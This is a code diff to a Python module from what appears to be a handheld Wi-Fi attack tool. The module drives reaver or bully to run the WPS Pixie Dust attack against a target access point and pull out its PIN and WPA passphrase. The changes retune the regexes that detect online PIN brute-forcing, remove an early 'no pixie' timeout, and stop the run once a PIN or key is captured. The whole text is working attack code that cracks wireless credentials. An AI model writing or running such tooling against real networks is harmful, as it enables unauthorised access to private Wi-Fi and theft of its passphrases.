@@ -32,11 +32,11 @@ FAIL_RE = re.compile(
     r"pin not found|pixie-?dust.*fail|Pixiewps fail|Pixiewps timeout|"
     r"failed to recover WPA key",
     re.I)
-# Reaver left -K pixie mode and started online PIN brute-force — abort.
+# Only abort when reaver is clearly in online PIN grind — NOT on
+# "re-trying last pin" / early "Trying pin", which happen during normal
+# pixie handshake retries and were soft-banning every AP on the LCD.
 PIN_BF_RE = re.compile(
-    r"Trying pin\s+[\"']?\d{4,8}"
-    r"|%\s*complete\s*@"
-    r"|re-trying last pin"
+    r"%\s*complete\s*@"
     r"|Nothing done, nothing to save",
     re.I)
 WPS_OFF_RE = re.compile(r"AP seems to have WPS turned off", re.I)
@@ -46,23 +46,19 @@ HARD_LOCK_RE = re.compile(
     re.I)
 BEACON_RE = re.compile(r"Received beacon from", re.I)
 # Real WPS exchange progress (not mere "Waiting for beacon").
-# Do NOT include "Trying pin" — that is online PIN BF after pixie gave up.
 EXCHANGE_RE = re.compile(
     r"Associated with|Received M[1-7]|Starting Pixie|Pixiewps:|"
     r"Sending EAPOL|EAPOL start",
     re.I)
-# Pixie-usable progress past endless M1/identity loops.
 PIXIE_PROGRESS_RE = re.compile(
     r"Received M[3-7]|Starting Pixie|Pixiewps:|WPS PIN|PIN FOUND",
     re.I)
 
 GETPSK_TIMEOUT = 120
-# Soft windows (capped by WPS Timeout). Looser than the first Rush cut —
-# many APs need a long M1/identity slog before M3/pixie finally lands.
-BEACON_SOFT_SEC = 12
-ASSOC_SOFT_SEC = 30
-# After assoc/M1, wait longer before declaring "no pixie" (was too aggressive).
-PIXIE_PROGRESS_SOFT_SEC = 40
+# Soft windows — only for truly silent APs. No M3 soft-bail: that was
+# killing slow targets that still yield a PIN if given the full timeout.
+BEACON_SOFT_SEC = 15
+ASSOC_SOFT_SEC = 35
 
 _STDBUF = shutil.which("stdbuf") or (
     "/usr/bin/stdbuf" if os.path.exists("/usr/bin/stdbuf") else None)
@@ -184,7 +180,6 @@ def pixie(mon, target, req, emit, stop_flag):
     timeout = config.opt_int(req.timing, "WPS Timeout", 180)
     beacon_soft = min(BEACON_SOFT_SEC, max(3, timeout // 3))
     assoc_soft = min(ASSOC_SOFT_SEC, max(beacon_soft + 5, timeout - 5))
-    progress_soft = min(PIXIE_PROGRESS_SOFT_SEC, max(assoc_soft + 5, timeout - 5))
 
     bin_path = tools.BULLY if tool == "bully" else tools.REAVER
     if not tools.tool_ok(bin_path):
@@ -194,8 +189,8 @@ def pixie(mon, target, req, emit, stop_flag):
 
     iface_mod.lock_channel(mon, target.get("channel"))
     cmd = _build_cmd(tool, mon, target, ignore_locks)
-    tools.log("wps pixie: timeout=%ss beacon=%ss assoc=%ss progress=%ss" % (
-        timeout, beacon_soft, assoc_soft, progress_soft))
+    tools.log("wps pixie: timeout=%ss beacon=%ss assoc=%ss" % (
+        timeout, beacon_soft, assoc_soft))
     try:
         proc = _spawn(cmd, clear_bssid=bssid)
     except Exception as e:  # noqa: BLE001
@@ -208,8 +203,6 @@ def pixie(mon, target, req, emit, stop_flag):
     psk = None
     saw_beacon = False
     saw_exchange = False
-    saw_pixie_progress = False
-    exchange_at = None
     result = {"ok": False, "essid": essid, "bssid": bssid}
     fd = proc.stdout.fileno()
     try:
@@ -223,7 +216,7 @@ def pixie(mon, target, req, emit, stop_flag):
                                  detail="timeout"))
                 break
 
-            # Soft timeouts — bail dead ends before burning the full window.
+            # Soft timeouts — silent APs only (gone / wrong channel).
             if not saw_beacon and elapsed > beacon_soft:
                 tools.log("wps SOFT: no beacon %ss %s" % (beacon_soft, bssid))
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
@@ -235,15 +228,8 @@ def pixie(mon, target, req, emit, stop_flag):
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="no assoc"))
                 break
-            if (saw_exchange and not saw_pixie_progress and exchange_at
-                    and (time.time() - exchange_at) > progress_soft):
-                tools.log("wps SOFT: no M3/pixie %ss %s" % (
-                    progress_soft, bssid))
-                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
-                                 detail="no pixie"))
-                break
 
-            # Visible phase: BEACON → ASSOC → PIXIE
+            # Visible phase: BEACON → ASSOC → PIXIE (full timeout once talking)
             if not saw_beacon:
                 phase, left, mx = ("BEACON",
                                    max(0, int(beacon_soft - elapsed)),
@@ -252,12 +238,6 @@ def pixie(mon, target, req, emit, stop_flag):
                 phase, left, mx = ("ASSOC",
                                    max(0, int(assoc_soft - elapsed)),
                                    assoc_soft)
-            elif not saw_pixie_progress:
-                # Countdown the progress soft window while stuck on M1/identity.
-                gone = time.time() - (exchange_at or start)
-                phase, left, mx = ("PIXIE",
-                                   max(0, int(progress_soft - gone)),
-                                   progress_soft)
             else:
                 phase, left, mx = ("PIXIE",
                                    max(0, int(timeout - elapsed)),
@@ -284,13 +264,9 @@ def pixie(mon, target, req, emit, stop_flag):
             if EXCHANGE_RE.search(line):
                 if not saw_exchange:
                     tools.log("wps: exchange started %s" % bssid)
-                    exchange_at = time.time()
                 saw_beacon = True
                 saw_exchange = True
             if PIXIE_PROGRESS_RE.search(line):
-                if not saw_pixie_progress:
-                    tools.log("wps: pixie progress %s" % bssid)
-                saw_pixie_progress = True
                 saw_exchange = True
                 saw_beacon = True
 
@@ -302,25 +278,21 @@ def pixie(mon, target, req, emit, stop_flag):
             if PIN_BF_RE.search(line):
                 tools.log("wps: abort online PIN BF %s" % bssid)
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
-                                 detail="no pixie"))
+                                 detail="pin bf"))
                 break
 
             m = PIN_RE.search(line)
             if m:
                 pin = m.group(1)
-                saw_pixie_progress = True
                 saw_exchange = True
+                # Pixie (or clear PIN line) — stop before online BF.
+                tools.log("wps: PIN %s %s" % (pin, bssid))
+                break
             got = _psk_from_line(line)
             if got is not None:
                 psk = got
-                saw_pixie_progress = True
                 saw_exchange = True
-            if psk is not None:
                 break
-            # Pixie success line (PIN found) — stop before online PIN BF.
-            if pin and re.search(r"pixie", line, re.I) and "PIN" in line.upper():
-                if not FAIL_RE.search(line):
-                    break
             if HARD_LOCK_RE.search(line) and not ignore_locks:
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                  detail="wps lock"))
